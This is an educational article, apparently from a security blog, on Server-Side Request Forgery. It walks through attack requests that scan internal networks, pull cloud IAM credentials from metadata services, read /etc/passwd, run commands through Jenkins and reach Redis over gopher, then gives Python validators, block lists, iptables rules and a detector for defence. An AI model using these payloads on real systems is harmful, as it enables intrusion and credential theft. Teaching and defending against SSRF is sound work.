---
title: Server-Side Request Forgery (SSRF) - Detailed Analysis
draft: false
date: 2025-01-01
tags:
  - owasp
  - ssrf
  - server_side_request_forgery
  - injection
  - cloud_security
  - internal_network
---

Server-Side Request Forgery (SSRF) is a critical web application vulnerability that occurs when an attacker can induce a server-side application to make HTTP requests to arbitrary domains of the attacker's choosing. This vulnerability enables attackers to bypass network access controls, scan internal networks, access cloud metadata services, and interact with internal services that are not directly accessible from the internet.

**Attack Methodology:**
SSRF exploits applications that fetch remote resources based on user-supplied URLs. Attackers leverage this functionality to:
- **Network Reconnaissance:** Scan internal network infrastructure and identify services
- **Cloud Metadata Exploitation:** Access AWS EC2 metadata, Azure Instance Metadata Service
- **Internal Service Interaction:** Communicate with databases, admin panels, and APIs
- **Port Scanning:** Enumerate open ports on internal systems
- **File System Access:** Read local files through file:// protocol handlers
- **Firewall Bypass:** Access services protected by perimeter security controls

**Common Vulnerable Patterns:**
- URL parameter fetching (`?url=https://example.com`)
- Webhook endpoints accepting callback URLs
- Image processing services accepting remote image URLs
- Document converters fetching remote resources
- Social media preview generation
- RSS feed readers and aggregators

**Basic SSRF Exploitation:**

Vulnerable application endpoint:
```http
GET /fetch?url=https://example.com HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0...
```

**Internal Network Reconnaissance:**
Attackers enumerate internal network ranges to discover running services:
```http
GET /fetch?url=http://192.168.1.1 HTTP/1.1
Host: vulnerable-app.com

GET /fetch?url=http://10.0.0.1:8080 HTTP/1.1
Host: vulnerable-app.com

GET /fetch?url=http://172.16.0.1:3306 HTTP/1.1
Host: vulnerable-app.com
```

**Response Analysis:**
- **200 OK:** Service is running and accessible
- **Connection Timeout:** Host exists but port is filtered/closed
- **Connection Refused:** Host exists but service is not running
- **DNS Resolution Error:** Host does not exist

**Internal Service Discovery and Exploitation:**

Organizations commonly deploy internal services on private IP ranges:
- **10.0.0.0/8** (Class A private networks)
- **172.16.0.0/12** (Class B private networks)
- **192.168.0.0/16** (Class C private networks)

**Administrative Interface Access:**
```http
GET /fetch?url=http://10.0.0.5:8080/admin HTTP/1.1
Host: vulnerable-app.com
```

**Common Internal Service Ports:**
```bash
# Database services
3306 (MySQL), 5432 (PostgreSQL), 1521 (Oracle), 27017 (MongoDB)

# Web services
80 (HTTP), 443 (HTTPS), 8080 (Alt HTTP), 9200 (Elasticsearch)

# Admin interfaces
8443 (Admin HTTPS), 9090 (Prometheus), 3000 (Grafana)

# Container orchestration
6443 (Kubernetes API), 2376 (Docker), 8500 (Consul)
```

**Exploitation Example - Jenkins Admin Panel:**
```http
GET /fetch?url=http://10.0.0.5:8080/jenkins/script HTTP/1.1
Host: vulnerable-app.com
```

If Jenkins script console is accessible without authentication:
```groovy
// Remote code execution via Groovy script
println "whoami".execute().text
println "ls -la /etc/passwd".execute().text
```

**Cloud Infrastructure Exploitation:**

**AWS EC2 Instance Metadata Service (IMDS):**
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable-app.com
```

**Metadata Enumeration Sequence:**
```bash
# 1. Discover available metadata endpoints
/latest/meta-data/
/latest/meta-data/iam/
/latest/meta-data/iam/security-credentials/

# 2. Extract IAM role credentials
/latest/meta-data/iam/security-credentials/EC2-Role-Name

# 3. Retrieve temporary AWS credentials
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2024-01-15T12:00:00Z"
}
```

**Kubernetes API Server Exploitation:**
```http
GET /fetch?url=https://10.0.0.1:6443/api/v1/namespaces HTTP/1.1
Host: vulnerable-app.com

GET /fetch?url=https://10.0.0.1:6443/api/v1/pods HTTP/1.1
Host: vulnerable-app.com
```

**Container Runtime APIs:**
```http
# Docker API (typically on port 2375/2376)
GET /fetch?url=http://localhost:2375/containers/json HTTP/1.1

# Extract container information
GET /fetch?url=http://localhost:2375/containers/container_id/json HTTP/1.1
```

**Cloud Provider Metadata Services:**
```bash
# AWS
http://169.254.169.254/latest/meta-data/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
```

**Localhost/Loopback Interface Exploitation:**

Many applications implement IP-based access controls that only allow localhost connections:

**Admin Panel Bypass:**
```http
GET /fetch?url=http://127.0.0.1/admin HTTP/1.1
Host: vulnerable-app.com

GET /fetch?url=http://localhost:8080/management HTTP/1.1
Host: vulnerable-app.com
```

**Alternative Localhost Representations:**
```bash
# Standard loopback
127.0.0.1, localhost

# Alternative representations
127.1, 127.0.1, 0.0.0.0, 0, 0x7f000001

# IPv6 loopback
::1, ::ffff:127.0.0.1

# Domain-based bypasses
localtest.me, 127.0.0.1.nip.io, localhost.localdomain
```

**Internal Service Interaction:**
```http
# Redis (default port 6379)
GET /fetch?url=http://127.0.0.1:6379/ HTTP/1.1

# Memcached (default port 11211)
GET /fetch?url=http://127.0.0.1:11211/ HTTP/1.1

# Internal monitoring endpoints
GET /fetch?url=http://127.0.0.1:9090/metrics HTTP/1.1
```

**Protocol Smuggling Examples:**
```http
# Gopher protocol for raw TCP
GET /fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aeval%0d%0a HTTP/1.1

# File protocol for local file access
GET /fetch?url=file:///etc/passwd HTTP/1.1
```

## Comprehensive Prevention Strategies

### 1. **Network-Level Access Controls**

**IP Address Blacklisting:**
```python
import ipaddress
import re

class SSRFProtection:
    def __init__(self):
        self.blocked_networks = [
            ipaddress.ip_network('127.0.0.0/8'),      # Loopback
            ipaddress.ip_network('10.0.0.0/8'),       # Private Class A
            ipaddress.ip_network('172.16.0.0/12'),    # Private Class B
            ipaddress.ip_network('192.168.0.0/16'),   # Private Class C
            ipaddress.ip_network('169.254.0.0/16'),   # Link-local
            ipaddress.ip_network('224.0.0.0/4'),      # Multicast
            ipaddress.ip_network('240.0.0.0/4'),      # Reserved
        ]

        self.blocked_ports = [22, 23, 25, 53, 135, 139, 445, 1433, 1521, 3306, 5432, 6379, 11211]

    def is_safe_url(self, url):
        try:
            parsed = urllib.parse.urlparse(url)

            # Block non-HTTP protocols
            if parsed.scheme not in ['http', 'https']:
                return False

            # Resolve hostname to IP
            ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))

            # Check against blocked networks
            for network in self.blocked_networks:
                if ip in network:
                    return False

            # Check blocked ports
            port = parsed.port or (80 if parsed.scheme == 'http' else 443)
            if port in self.blocked_ports:
                return False

            return True

        except (ValueError, socket.gaierror):
            return False
```

### 2. **URL Validation and Allowlisting**

**Strict Domain Allowlisting:**
```python
import re
from urllib.parse import urlparse

class URLValidator:
    def __init__(self):
        self.allowed_domains = [
            'api.example.com',
            'cdn.example.com',
            'trusted-partner.com'
        ]

        self.allowed_protocols = ['http', 'https']

    def validate_url(self, url):
        """Validate URL against allowlist and security rules."""
        try:
            parsed = urlparse(url)

            # Protocol validation
            if parsed.scheme not in self.allowed_protocols:
                raise ValueError(f"Protocol {parsed.scheme} not allowed")

            # Domain validation
            if parsed.netloc not in self.allowed_domains:
                raise ValueError(f"Domain {parsed.netloc} not in allowlist")

            # Path validation - prevent path traversal
            if '../' in parsed.path or '..\\' in parsed.path:
                raise ValueError("Path traversal detected")

            # Query parameter validation
            if any(keyword in parsed.query.lower() for keyword in ['localhost', '127.0.0.1', 'file://']):
                raise ValueError("Suspicious query parameters")

            return True

        except Exception as e:
            self.log_security_event('url_validation_failed', url, str(e))
            return False
```

### 3. **Proxy-Based Request Routing**

**Secure HTTP Proxy Implementation:**
```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class SecureHTTPClient:
    def __init__(self):
        self.session = requests.Session()

        # Configure timeouts and retries
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["HEAD", "GET", "OPTIONS"]
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Set security headers
        self.session.headers.update({
            'User-Agent': 'SecureApp/1.0',
            'Accept': 'application/json,text/html',
            'Cache-Control': 'no-cache'
        })

    def fetch_url(self, url, timeout=10):
        """Safely fetch external URL with comprehensive protection."""

        # Validate URL first
        if not self.url_validator.validate_url(url):
            raise SecurityError("URL failed validation")

        try:
            response = self.session.get(
                url,
                timeout=timeout,
                allow_redirects=False,  # Prevent redirect-based bypasses
                verify=True,            # Verify SSL certificates
                stream=False            # Load entire response into memory
            )

            # Validate response size
            if len(response.content) > 5 * 1024 * 1024:  # 5MB limit
                raise ValueError("Response too large")

            # Validate content type
            content_type = response.headers.get('content-type', '')
            if not any(allowed in content_type for allowed in ['application/json', 'text/html', 'text/plain']):
                raise ValueError("Invalid content type")

            return response

        except requests.exceptions.RequestException as e:
            self.log_security_event('http_request_failed', url, str(e))
            raise SecurityError("Request failed security check")
```

### 4. **Network Segmentation and Firewall Rules**

**iptables Rules for SSRF Prevention:**
```bash
#!/bin/bash

# Block outbound connections to internal networks from web application
iptables -A OUTPUT -s 10.0.1.100 -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -s 10.0.1.100 -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -s 10.0.1.100 -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -s 10.0.1.100 -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -s 10.0.1.100 -d 169.254.0.0/16 -j DROP

# Block cloud metadata services
iptables -A OUTPUT -s 10.0.1.100 -d 169.254.169.254 -j DROP

# Allow only specific external destinations
iptables -A OUTPUT -s 10.0.1.100 -d api.example.com -j ACCEPT
iptables -A OUTPUT -s 10.0.1.100 -d cdn.example.com -j ACCEPT

# Log and drop all other outbound traffic
iptables -A OUTPUT -s 10.0.1.100 -j LOG --log-prefix "SSRF_ATTEMPT: "
iptables -A OUTPUT -s 10.0.1.100 -j DROP
```

### 5. **Advanced Detection and Monitoring**

**Real-time SSRF Detection:**
```python
import asyncio
import aiohttp
from collections import defaultdict
from datetime import datetime, timedelta

class SSRFMonitor:
    def __init__(self):
        self.request_log = defaultdict(list)
        self.blocked_ips = set()

    async def monitor_request(self, source_ip, target_url, user_agent):
        """Monitor and analyze outbound requests for SSRF patterns."""

        current_time = datetime.now()

        # Log the request
        self.request_log[source_ip].append({
            'timestamp': current_time,
            'target': target_url,
            'user_agent': user_agent
        })

        # Analyze patterns
        recent_requests = [
            req for req in self.request_log[source_ip]
            if current_time - req['timestamp'] < timedelta(minutes=5)
        ]

        # Detect rapid internal network scanning
        internal_targets = [
            req['target'] for req in recent_requests
            if any(net in req['target'] for net in ['127.0.0.1', '192.168.', '10.', '172.'])
        ]

        if len(internal_targets) > 10:
            await self.alert_security_team(
                f"Potential SSRF attack from {source_ip}: {len(internal_targets)} internal requests"
            )
            self.blocked_ips.add(source_ip)

        # Detect metadata service access attempts
        if '169.254.169.254' in target_url:
            await self.alert_security_team(
                f"Critical: Metadata service access attempt from {source_ip}"
            )
            self.blocked_ips.add(source_ip)

    async def alert_security_team(self, message):
        """Send real-time security alerts."""
        webhook_url = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

        payload = {
            "text": f"🚨 SSRF Alert: {message}",
            "channel": "#security-alerts",
            "username": "SSRF Monitor"
        }

        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json=payload)
```

*Reference: OWASP Top 10 Security Risks*
